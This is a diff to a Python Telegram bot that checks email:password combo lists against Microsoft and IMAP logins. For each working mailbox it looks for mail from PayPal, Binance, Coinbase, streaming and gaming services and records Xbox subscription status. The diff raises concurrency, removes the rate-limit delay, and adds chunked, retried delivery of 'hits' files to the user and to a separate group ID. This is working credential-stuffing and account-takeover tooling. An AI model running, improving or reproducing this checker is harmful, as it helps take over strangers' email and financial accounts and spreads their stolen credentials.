@@ -226,7 +226,7 @@ class UnifiedChecker:
         self.session = requests.Session()
         self.session.trust_env = False
         self.session.proxies = {}
-        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=0)
+        adapter = requests.adapters.HTTPAdapter(pool_connections=128, pool_maxsize=256, max_retries=0)
         self.session.mount('https://', adapter)
         self.session.mount('http://', adapter)
         self.uuid = str(uuid.uuid4())
@@ -234,9 +234,6 @@ class UnifiedChecker:
         self.services_map = custom_services or {
             'advertise-support.facebook.com': 'Facebook',
             'mail.instagram.com': 'Instagram',
-            'account.tiktok.com': 'TikTok',
-            'x.com': 'Twitter',
-            'youtube.com': 'YouTube',
             'discordapp.com': 'Discord',
             'spotify.com': 'Spotify',
             'netflix.com': 'Netflix',
@@ -244,37 +241,19 @@ class UnifiedChecker:
             'epicgames.com': 'Epic Games',
             'riotgames.com': 'Riot Games',
             'ubisoft.com': 'Ubisoft',
-            'blizzard.com': 'Blizzard',
             'rockstargames.com': 'Rockstar',
-            'nintendo.com': 'Nintendo',
-            'roblox.com': 'Roblox',
             'paypal.com': 'PayPal',
             'binance.com': 'Binance',
             'amazon.com': 'Amazon',
             'ebay.com': 'eBay',
-            'aliexpress.com': 'AliExpress',
-            'temu.com': 'Temu',
-            'shein.com': 'Shein',
-            'hulu.com': 'Hulu',
             'disneyplus.com': 'Disney+',
-            'viu.com': 'Viu',
-            'tubitv.com': 'Tubi TV',
             'crunchyroll.com': 'Crunchyroll',
             'ea.com': 'EA Sports',
             'battlenet.com': 'Battle.net',
             'apple.com': 'Apple',
             'icloud.com': 'iCloud',
-            'canva.com': 'Canva',
             'github.com': 'GitHub',
-            'gitlab.com': 'GitLab',
-            'bitbucket.com': 'Bitbucket',
-            'replit.com': 'Replit',
-            'azure.microsoft.com': 'Azure',
-            'metrobank.com.ph': 'Metrobank',
-            'landbank.com': 'LandBank',
-            'securitybank.com': 'Security Bank',
             'no-reply@coinbase.com': 'Coinbase',
-            'etoro.com': 'eToro',
         }
 
     def log(self, msg):
@@ -1276,6 +1255,7 @@ class ScanSession:
         self.accounts_microsoft = [] # accounts to scan in MS mode
         self.accounts_another = []   # accounts to scan in IMAP mode
         self.imap_hits_by_domain = {} # domain -> hit_count for status msg
+        self.chunks_dir = None
         self.country_results = {}
         self.username = ""
         self.plan = ""
@@ -1338,27 +1318,77 @@ class BotApp:
                 pass
         sess.last_status_time = now
 
-    def _flush_batch(self, sess: ScanSession, chat_id):
+    def _flush_batch(self, sess: ScanSession, chat_id, flush_all=False):
         with sess.hits_batch_lock:
             try:
-                def send_file_with_name(lines, filename):
-                    if not lines: return
-                    unique_name = f"{filename.split('.')[0]}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
-                    xpath = os.path.join(os.getcwd(), unique_name)
-                    with open(xpath, "w", encoding="utf-8") as f:
-                        f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in lines])
-                    vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                    user_tag = sess.username or str(chat_id)
-                    send_document(chat_id, xpath, caption=f"{filename.split('.')[0]} batch ({len(lines)})")
-                    try: send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {filename.split('.')[0]} batch ({len(lines)})")
-                    except: pass
-                    try: os.remove(xpath)
-                    except: pass
-
-                send_file_with_name(sess.batch, "hits.txt")
-                send_file_with_name(sess.batch_xbox, "xbox.txt")
-                
-                sess.batch.clear(); sess.batch_xbox.clear(); sess.batch_services.clear()
+                def send_with_retries(path, caption):
+                    tries = 3
+                    for i in range(tries):
+                        try:
+                            resp = send_document(chat_id, path, caption=caption)
+                            if isinstance(resp, dict) and not resp.get("ok", False):
+                                raise RuntimeError("telegram send failed")
+                            return True
+                        except:
+                            time.sleep(2 * (i + 1))
+                    return False
+                def send_batches(lines, filename, force_all=False):
+                    base = filename.split('.')[0]
+                    sent_any = False
+                    while len(lines) >= 50:
+                        chunk = lines[:50]
+                        unique_name = f"{base}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
+                        xpath = os.path.join(os.getcwd(), unique_name)
+                        with open(xpath, "w", encoding="utf-8") as f:
+                            f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in chunk])
+                        ok = send_with_retries(xpath, caption=f"{base} batch (50)")
+                        if ok:
+                            try:
+                                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
+                                user_tag = sess.username or str(chat_id)
+                                try:
+                                    resp_g = send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {base} batch (50)")
+                                    if isinstance(resp_g, dict) and not resp_g.get("ok", False):
+                                        pass
+                                except:
+                                    pass
+                            finally:
+                                try: os.remove(xpath)
+                                except: pass
+                            del lines[:50]
+                            sent_any = True
+                        else:
+                            try: os.remove(xpath)
+                            except: pass
+                            break
+                    if force_all and lines:
+                        chunk = lines[:]
+                        unique_name = f"{base}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
+                        xpath = os.path.join(os.getcwd(), unique_name)
+                        with open(xpath, "w", encoding="utf-8") as f:
+                            f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in chunk])
+                        ok = send_with_retries(xpath, caption=f"{base} batch ({len(chunk)})")
+                        if ok:
+                            try:
+                                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
+                                user_tag = sess.username or str(chat_id)
+                                try:
+                                    resp_g = send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {base} batch ({len(chunk)})")
+                                    if isinstance(resp_g, dict) and not resp_g.get("ok", False):
+                                        pass
+                                except:
+                                    pass
+                            finally:
+                                try: os.remove(xpath)
+                                except: pass
+                            lines.clear()
+                            sent_any = True
+                        else:
+                            try: os.remove(xpath)
+                            except: pass
+                    return sent_any
+                send_batches(sess.batch, "hits.txt", force_all=flush_all)
+                send_batches(sess.batch_xbox, "xbox.txt", force_all=flush_all)
             except:
                 pass
 
@@ -1386,132 +1416,157 @@ class BotApp:
         send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
 
-        def worker(acc):
-            if sess.stop_ev.is_set():
-                return
-            em, pw = acc
-            if sess.is_imap:
-                # IMAP / Another mode logic
-                try:
-                    checker = ImapChecker()
-                    r = checker.check(em, pw)
-                except:
-                    r = {"status": "BAD"}
+        def run_batch(sub_accounts):
+            def worker(acc):
                 if sess.stop_ev.is_set():
                     return
-                
-                with self.lock:
-                    sess.checked += 1
-                
-                if r and r.get("status") == "HIT":
-                    line = f"{em}:{pw}"
-                    sv = r.get("services", {}) or {}
-                    sv_found = [k for k, v in sv.items() if v]
-                    if sv_found:
-                        line += f" | Services: {', '.join(sv_found)}"
-                    
-                    # group by domain for "type" in status
-                    dom = em.split("@")[-1].lower()
-                    
+                em, pw = acc
+                if sess.is_imap:
+                    try:
+                        checker = ImapChecker()
+                        r = checker.check(em, pw)
+                    except:
+                        r = {"status": "BAD"}
+                    if sess.stop_ev.is_set():
+                        return
                     with self.lock:
-                        sess.results.append(line)
-                        sess.hits += 1
-                        sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
-                        for k, v in sv.items():
-                            if v:
-                                sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
-                    
-                    # Batch-send
-                    with sess.hits_batch_lock:
-                        sess.batch.append(line)
-                        if len(sess.batch) >= flush_threshold:
-                            self._flush_batch(sess, chat_id)
-                else:
-                    with self.lock:
-                        sess.bads += 1
-            else:
-                # Regular Mail Access Logic (Microsoft)
-                try:
-                    checker = UnifiedChecker(debug=False)
-                    if getattr(sess, "custom_domains", None):
-                        for dom in sess.custom_domains:
-                            d = dom.strip()
-                            if d:
-                                checker.services_map[d] = d
-                    elif sess.custom_domain:
-                        checker.services_map[sess.custom_domain.strip()] = "Custom"
-                    r = checker.check(em, pw)
-                except:
-                    r = {"status": "BAD"}
-                if sess.stop_ev.is_set():
-                    return
-                
-                with self.lock:
-                    sess.checked += 1
-                
-                if r and r.get("status") == "HIT":
-                    # Build lines
-                    line = format_result(r)
-
-                    # services-only line
-                    sv = r.get("services", {}) or {}
-                    sv_found = [k for k, v in sv.items() if v]
-                    services_line = None
-                    # xbox-only line (premium and not expired shows details)
-                    xbox_line = None
-                    xb = (r.get("xbox") or {})
-                    xdet = xb.get("details") or ""
-                    if (xb.get("status","").upper() != "FREE") and xdet:
-                        xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
-                    
-                    with self.lock:
-                        sess.results.append(line)
-                        sess.hits += 1
-                        # no services-only file output
-                        if xbox_line:
-                            sess.results_xbox.append(xbox_line)
-                        # update aggregates
-                        xb_status = (r.get("xbox") or {}).get("status", "").upper()
-                        if xb_status and xb_status != "FREE":
-                            sess.xbox_premium += 1
-                        c = (r.get("country") or "??").strip().upper()
-                        sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
-                        if c not in sess.country_results:
-                            sess.country_results[c] = []
-                        sess.country_results[c].append(line)
+                        sess.checked += 1
+                    if r and r.get("status") == "HIT":
+                        line = f"{em}:{pw}"
                         sv = r.get("services", {}) or {}
-                        for k, v in sv.items():
-                            if v:
-                                sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
-                    
-                    # Batch-send every 100 hits
-                    with sess.hits_batch_lock:
-                        sess.batch.append(line)
-                        if xbox_line:
-                            sess.batch_xbox.append(xbox_line)
-                        if len(sess.batch) >= flush_threshold:
-                            self._flush_batch(sess, chat_id)
+                        sv_found = [k for k, v in sv.items() if v]
+                        if sv_found:
+                            line += f" | Services: {', '.join(sv_found)}"
+                        dom = em.split("@")[-1].lower()
+                        with self.lock:
+                            sess.results.append(line)
+                            sess.hits += 1
+                            sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
+                            for k, v in sv.items():
+                                if v:
+                                    sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
+                        with sess.hits_batch_lock:
+                            sess.batch.append(line)
+                            if len(sess.batch) >= flush_threshold:
+                                self._flush_batch(sess, chat_id, flush_all=False)
+                    else:
+                        with self.lock:
+                            sess.bads += 1
                 else:
+                    try:
+                        checker = UnifiedChecker(debug=False)
+                        if getattr(sess, "custom_domains", None):
+                            for dom in sess.custom_domains:
+                                d = dom.strip()
+                                if d:
+                                    checker.services_map[d] = d
+                        elif sess.custom_domain:
+                            checker.services_map[sess.custom_domain.strip()] = "Custom"
+                        r = checker.check(em, pw)
+                    except:
+                        r = {"status": "BAD"}
+                    if sess.stop_ev.is_set():
+                        return
                     with self.lock:
-                        sess.bads += 1
-                
-            # periodic status update for both modes
-            if sess.checked % 20 == 0:
-                self._send_status(sess, chat_id)
-            time.sleep(0 if is_vip else 0.12)
+                        sess.checked += 1
+                    if r and r.get("status") == "HIT":
+                        line = format_result(r)
+                        sv = r.get("services", {}) or {}
+                        sv_found = [k for k, v in sv.items() if v]
+                        services_line = None
+                        xbox_line = None
+                        xb = (r.get("xbox") or {})
+                        xdet = xb.get("details") or ""
+                        if (xb.get("status","").upper() != "FREE") and xdet:
+                            xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
+                        with self.lock:
+                            sess.results.append(line)
+                            sess.hits += 1
+                            if xbox_line:
+                                sess.results_xbox.append(xbox_line)
+                            xb_status = (r.get("xbox") or {}).get("status", "").upper()
+                            if xb_status and xb_status != "FREE":
+                                sess.xbox_premium += 1
+                            c = (r.get("country") or "??").strip().upper()
+                            sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
+                            if c not in sess.country_results:
+                                sess.country_results[c] = []
+                            sess.country_results[c].append(line)
+                            sv = r.get("services", {}) or {}
+                            for k, v in sv.items():
+                                if v:
+                                    sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
+                        with sess.hits_batch_lock:
+                            sess.batch.append(line)
+                            if xbox_line:
+                                sess.batch_xbox.append(xbox_line)
+                            if len(sess.batch) >= flush_threshold:
+                                self._flush_batch(sess, chat_id, flush_all=False)
+                    else:
+                        with self.lock:
+                            sess.bads += 1
+                if sess.checked % 20 == 0:
+                    self._send_status(sess, chat_id)
+                time.sleep(0 if is_vip else 0.0)
+            max_w = max(16, min(128, (os.cpu_count() or 4) * 8))
+            ex = ThreadPoolExecutor(max_workers=max_w)
+            fs = [ex.submit(worker, acc) for acc in sub_accounts]
+            try:
+                pending = set(fs)
+                while pending and not sess.stop_ev.is_set():
+                    done = {f for f in list(pending) if f.done()}
+                    pending -= done
+                    self._send_status(sess, chat_id)
+                    time.sleep(0.3)
+            finally:
+                try: ex.shutdown(wait=False, cancel_futures=True)
+                except: pass
 
-        ex = ThreadPoolExecutor(max_workers=(30 if is_vip else 12))
-        fs = [ex.submit(worker, acc) for acc in accounts]
+        chunks_dir = os.path.join(os.getcwd(), f"scan_chunks_{chat_id}_{uuid.uuid4().hex[:6]}")
         try:
-            pending = set(fs)
-            while pending and not sess.stop_ev.is_set():
-                done = {f for f in list(pending) if f.done()}
-                pending -= done
-                self._send_status(sess, chat_id)  # keep UI fresh
-                time.sleep(0.5)
-        finally:
-            try: ex.shutdown(wait=False, cancel_futures=True)
+            os.makedirs(chunks_dir, exist_ok=True)
+            sess.chunks_dir = chunks_dir
+        except:
+            sess.chunks_dir = None
+        chunk_paths = []
+        for i in range(0, len(accounts), 100):
+            sub = accounts[i:i+100]
+            p = os.path.join(chunks_dir, f"chunk_{(i//100)+1}.txt") if sess.chunks_dir else None
+            if p:
+                try:
+                    with open(p, "w", encoding="utf-8") as f:
+                        for em, pw in sub:
+                            f.write(f"{em}:{pw}\n")
+                    chunk_paths.append(p)
+                except:
+                    chunk_paths = []
+                    break
+        if chunk_paths:
+            for cp in chunk_paths:
+                if sess.stop_ev.is_set():
+                    break
+                try:
+                    with open(cp, "r", encoding="utf-8") as f:
+                        lines = [ln.strip() for ln in f if ln.strip()]
+                    subs = []
+                    for ln in lines:
+                        if ":" in ln:
+                            parts = ln.split(":", 1)
+                            em = parts[0].strip()
+                            pw = parts[1].strip()
+                            if em and pw:
+                                subs.append((em, pw))
+                    if subs:
+                        run_batch(subs)
+                finally:
+                    try: os.remove(cp)
+                    except: pass
+            try:
+                if sess.chunks_dir and os.path.isdir(sess.chunks_dir):
+                    os.rmdir(sess.chunks_dir)
             except: pass
+        else:
+            run_batch(accounts)
         self.finish(chat_id)
 
     def finish(self, chat_id):
@@ -1519,8 +1574,8 @@ class BotApp:
             sess = self.sessions.get(chat_id)
         if not sess:
             return
-        # flush remaining batch
-        self._flush_batch(sess, chat_id)
+        # flush remaining batch (send أي شيء أقل من 50 أيضاً)
+        self._flush_batch(sess, chat_id, flush_all=True)
         try:
             name = f"results_{uuid.uuid4().hex[:8]}.txt"
             path = os.path.join(os.getcwd(), name)
@@ -1548,6 +1603,7 @@ class BotApp:
                 pass
             try:
                 if xbox_path: os.remove(xbox_path)
+                if path: os.remove(path)
             except: pass
         except:
             send_message(chat_id, "Failed to prepare results")
@@ -1680,6 +1736,19 @@ class BotApp:
         if not BOT_TOKEN:
             print("Set TELEGRAM_BOT_TOKEN env")
             return
+        try:
+            drop_env = os.getenv("DROP_PENDING_UPDATES", "true").strip().lower()
+            if drop_env in ("1", "true", "yes", "y", "on"):
+                j = get_updates(None, timeout=0)
+                max_id = None
+                for upd in j.get("result", []):
+                    uid = upd.get("update_id")
+                    if isinstance(uid, int):
+                        max_id = uid if max_id is None else max(max_id, uid)
+                if max_id is not None:
+                    self.offset = max_id + 1
+        except:
+            pass
         while True:
             try:
                 j = get_updates(self.offset, timeout=50)
